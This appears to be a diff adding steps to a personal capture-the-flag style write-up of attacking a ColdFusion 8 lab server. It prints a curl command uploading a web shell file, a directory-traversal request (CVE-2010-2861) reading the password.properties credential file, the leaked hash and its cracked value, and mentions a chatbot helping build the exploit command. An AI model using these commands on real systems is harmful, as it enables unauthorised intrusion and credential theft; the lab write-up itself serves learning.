@@ -35,3 +35,31 @@ msf6 auxiliary(gather/coldfusion_pwd_props) > run
 [*] Auxiliary module execution completed
 
 This metasploit module didn't work either. Trying to enumerate further.
+After continously trying to automate file uploads using metasploit, they weren't working. I tried a manual file upload:
+┌──(cesar㉿kali)-[~]
+└─$ curl -F "NewFile=@shell.cfm" "http://10.129.132.220:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"
+
+the upload succeeded. Could not locate the uploaded file. Moved onto another vulnerability.
+
+After reading the github repository on CVE-2010-2861, I ran this command with the help of chatgpt:
+curl -s "http://10.129.132.220:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"
+and I was able to find passwords.
+
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+
+First step was to break down the hash. It's an RDS hash. ran:
+echo "2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03" | hashid
+returned SHA-1. Time to crack
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+2f635f6d20e3fde0c53075a84b68fb07dcec9b03:happyday
+
+Login to admin panel with this password was a success.
+
+
